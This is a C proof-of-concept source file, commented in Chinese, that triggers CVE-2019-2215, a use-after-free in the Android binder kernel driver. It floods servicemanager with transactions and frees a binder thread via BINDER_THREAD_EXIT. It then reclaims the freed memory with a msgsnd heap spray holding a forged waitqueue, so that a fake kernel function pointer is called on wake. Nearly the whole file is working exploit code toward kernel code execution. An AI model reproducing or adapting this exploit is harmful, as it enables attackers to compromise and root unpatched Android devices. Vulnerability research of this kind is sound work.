/*
 * CVE-2019-2215 wake 路径触发链 v2（P2.10 §2.3）
 *
 * 目标 = servicemanager（系统 context mgr，handle 0，无需自建）：
 *   flood N 线程各发 1 条同步事务占住 servicemanager 的唯一 binder 线程
 *   → 主线程的 t 排 proc->todo 尾（t->from = 主线程的 binder_thread A）
 *   → A 的 BINDER_THREAD_EXIT：A 自己的 transaction_stack 空，t->from 悬空 → kfree(A)
 *   → writev(32 iovec) kmalloc(256) 重占位 A chunk，伪造 waitqueue
 *   → servicemanager 处理到 t：找不到服务 → BR_FAILED_REPLY
 *     reply 路径 target_thread = t->from（悬空 A）：
 *       成功路径 target_wait = &A->wait → wake UAF
 *       失败路径 binder_send_failed_reply(t) → t->from → wake UAF
 *
 * fake 链在内核地址（servicemanager 的 kworker/线程上下文，无我们的 mm）：
 *   c0a88100: .word 1(flags), c0a88000(func=hook), c0a88100(next), 0(prev)
 *   c0a88000: hook 写 0x40 到 c0a88020
 * 观测：ktool dump c0a88020 8 → 40000000 = wake 路径实锤
 *
 * 用法: binder_wake3 [flood_n]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define BINDER_WRITE_READ   0xc0186201UL
#define BINDER_VERSION      0xc0046209UL
#define BINDER_THREAD_EXIT  0x40046208UL
#define BC_TRANSACTION      0x40286300UL

struct binder_write_read {
	int32_t  write_size, write_consumed;
	uint32_t write_buffer;
	int32_t  read_size, read_consumed;
	uint32_t read_buffer;
};

struct binder_transaction_data {
	union { uint32_t handle; uint32_t ptr; } target;
	uint32_t cookie;
	uint32_t code;
	uint32_t flags;
	int32_t  sender_pid;
	uint32_t sender_euid;
	uint32_t data_size;
	uint32_t offsets_size;
	union {
		struct { uint32_t buffer; uint32_t offsets; } ptr;
		uint8_t buf[8];
	} data;
};

static struct iovec g_iov[32];
static int g_lf = -1;
static volatile int g_start = 0;
static volatile long g_sent = 0, g_want = 0;
static int g_fd = -1, g_msqid = -1;
#define MTEXTLEN 232
struct msgbuf_t { long mtype; char mtext[MTEXTLEN]; };
static struct msgbuf_t g_msg;

static void lg(const char *fmt, ...)
{
	char buf[256];
	va_list ap;
	int n;
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (n > 0) {
		write(1, buf, n);
		if (g_lf >= 0) { write(g_lf, buf, n); fsync(g_lf); }
	}
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s); CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int bwr(int fd, void *wb, int ws, void *rb, int rs)
{
	struct binder_write_read b;
	memset(&b, 0, sizeof b);
	b.write_size = ws; b.write_buffer = (uint32_t)(uintptr_t)wb;
	b.read_size  = rs; b.read_buffer  = (uint32_t)(uintptr_t)rb;
	return ioctl(fd, BINDER_WRITE_READ, &b);
}

/* BC_TRANSACTION 到 context mgr（handle 0），同步，带服务名数据（不存在 → 快速失败） */
static int send_txn(int fd, void *data, int dsize)
{
	uint8_t wb[4 + sizeof(struct binder_transaction_data)];
	struct binder_transaction_data *tr = (void *)(wb + 4);

	memset(wb, 0, sizeof wb);
	*(uint32_t *)wb = BC_TRANSACTION;
	memset(tr, 0, sizeof *tr);
	tr->target.handle = 0;
	tr->data_size = dsize;
	tr->data.ptr.buffer = (uint32_t)(uintptr_t)data;
	return bwr(fd, wb, sizeof wb, NULL, 0);
}

/* flood 线程：各持自己的 binder_thread（同 fd），发 1 条同步事务 */
static void *flood_thread(void *a)
{
	long id = (long)a;
	static char junk[64];
	pin_cpu(1 + (int)(id % 3));
	while (!g_start) __sync_synchronize();
	memset(junk, 0x42, sizeof junk);
	send_txn(g_fd, junk, sizeof junk);
	__sync_fetch_and_add(&g_sent, 1);
	while (g_start) usleep(100000);   /* 保活：静态 glibc 线程退出在 Android 上会挂 */
	return NULL;
}

int main(int argc, char **argv)
{
	int i, r, pipew, fd1;
	void *map1, *dat;
	static uint8_t payload[64];
	long nflood = (argc > 1) ? atol(argv[1]) : 150;
	static pthread_t fth[512];

	g_lf = open("/data/local/tmp/bw.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	setvbuf(stdout, NULL, _IONBF, 0);
	pin_cpu(0);
	lg("=== binder_wake3 flood=%ld pid=%d ===\n", nflood, getpid());

	/* ---------- [1] binder fd + map ---------- */
	fd1 = open("/dev/binder", O_RDWR);
	g_fd = fd1;
	if (fd1 < 0) { lg("[!] open errno=%d\n", errno); return 1; }
	map1 = mmap(NULL, 0x400000, PROT_READ, MAP_PRIVATE, fd1, 0);
	lg("[1] fd=%d map=%p\n", fd1, map1);

	/* ---------- [2] msgsnd spray 缓冲（msg_msg 头 24B + mtext 232B = 256） ---------- */
	g_msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	if (g_msqid < 0) { lg("[!] msgget errno=%d\n", errno); return 2; }
	memset(&g_msg, 0, sizeof g_msg);
	g_msg.mtype = 1;
	/* wait 字段在 binder_thread+0x2C，映射到 mtext（chunk+0x18 起）：
	 *   mtext[20..24] = wait.lock        = 0（ticket 空闲）
	 *   mtext[24..28] = wait.next        = 0xc0a88100（内核 fake wqt）
	 *   mtext[28..32] = wait.prev        = 0 */
	*(uint32_t *)(g_msg.mtext + 24) = 0xc0a88100UL;
	lg("[2] msqid=%d, mtext ready (len=%d)\n", g_msqid, MTEXTLEN);

	/* ---------- [3] flood 占线 ---------- */
	if (nflood > 512) nflood = 512;
	for (i = 0; i < nflood; i++)
		pthread_create(&fth[i], NULL, flood_thread, (void *)(long)i);
	usleep(3000);
	g_want = nflood;
	g_start = 1;
	{
		long guard = 0;
		while (g_sent < nflood && guard++ < 200000000L) ;
	}
	lg("[4] flood sent=%ld\n", g_sent);

	/* ---------- [4] 主线程的 t（排 todo 尾） ---------- */
	memset(payload, 0x5a, sizeof payload);
	r = send_txn(fd1, payload, sizeof payload);
	lg("[5] main txn r=%d errno=%d (t->from=A @todo tail)\n", r, errno);
	if (r != 0) { lg("[!] main txn 失败\n"); return 4; }

	/* ---------- [5] A EXIT → t->from 悬空 → kfree(A) ---------- */
	r = ioctl(fd1, BINDER_THREAD_EXIT, NULL);
	lg("[6] thread_exit r=%d\n", r);

	/* ---------- [6] msgsnd spray 抢 chunk（copy_from_user 无字段检查） ---------- */
	r = msgsnd(g_msqid, &g_msg, MTEXTLEN, 0);
	lg("[7] msgsnd r=%d errno=%d\n", r, errno);

	/* ---------- [7] 等 servicemanager 处理到我们的 t（不阻塞 read） ---------- */
	for (i = 0; i < 20; i++) {
		int v = -1;
		ioctl(fd1, BINDER_VERSION, &v);
		usleep(100000);
	}
	lg("[9] done —— 外部验证: ktool dump c0a88020 8 (期望 40000000)\n");
	return 0;
}
